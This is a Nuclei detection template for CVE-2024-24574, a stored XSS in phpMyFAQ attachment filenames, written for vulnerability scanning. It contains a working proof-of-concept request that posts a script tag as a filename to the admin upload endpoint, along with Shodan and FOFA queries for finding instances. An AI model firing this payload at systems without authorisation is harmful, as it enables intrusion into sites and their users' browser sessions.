id: CVE-2024-24574

info:
  name: phpMyFAQ Stored XSS in Attachments Filename
  author: ProjectDiscoveryAI
  severity: medium
  description: |
    phpMyFAQ is vulnerable to stored XSS due to unsafe rendering of the filename in the attachments section.
    This allows an attacker to execute arbitrary JavaScript code in the context of the user's browser session.
    The vulnerability is patched in version 3.2.5.
  impact: |
    An attacker can exploit this vulnerability to execute malicious scripts in the context of a user's browser, leading to potential data theft or account compromise.
  remediation: |
    Upgrade phpMyFAQ to the latest version to patch the XSS vulnerability in attachment filenames.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:L
    cvss-score: 6.5
    cve-id: CVE-2024-24574
    cwe-id: CWE-79
    epss-score: 0.00067
    epss-percentile: 0.31147
    cpe: cpe:2.3:a:phpmyfaq:phpmyfaq:*:*:*:*:*:*:*:*
  metadata:
    vendor: phpmyfaq
    product: phpmyfaq
    shodan-query: http.html:"phpmyfaq"
    fofa-query:
      - body="phpmyfaq"
      - phpmyfaq-setup

http:
  - method: POST
    path:
      - "{{BaseURL}}/admin/index.php?action=ajax&ajax=att&ajaxaction=upload"

    body: |
      filename=<script>alert('XSS')</script>

    headers:
      Content-Type: application/x-www-form-urlencoded
    matchers:
      - type: word
        words:
          - "<script>alert('XSS')</script>"
        part: body
